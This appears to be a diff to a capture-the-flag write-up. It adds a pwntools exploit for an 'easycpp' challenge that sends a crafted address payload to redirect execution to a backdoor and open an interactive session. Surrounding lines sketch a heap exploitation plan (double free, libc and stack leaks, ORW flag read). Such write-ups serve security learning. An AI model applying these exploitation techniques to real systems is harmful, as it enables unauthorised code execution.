@@ -380,6 +380,32 @@ dele(0)
 io.interactive()
 ```
 
+### easycpp | Author：Lunatic
+
+```python
+# nc pwn.challenge.mini.lctf.online 10008
+
+from pwn import *
+
+context.log_level = 'debug'
+
+if args.G:
+    io = remote('pwn.challenge.mini.lctf.online', 10008)
+else:
+    io = process('./easycpp')
+
+backdoor = 0x80487BB
+buf = 0x804A0C0
+
+payload = p32(buf + 4) + p32(backdoor)
+
+# gdb.attach(io)
+
+io.sendline(payload)
+
+io.interactive()
+```
+
 ### heap_master | Author：Lunatic
 
 nc 后进行 double free 操作，发现程序没有 crash，说明服务器上使用的 libc 版本应该为 2.27（根据 sad 的 hint）。接下来的流程便是泄露 libc 地址，通过 environ 泄露栈地址，将 payload 写入栈中，orw 读取 flag（prctl 函数限制）。
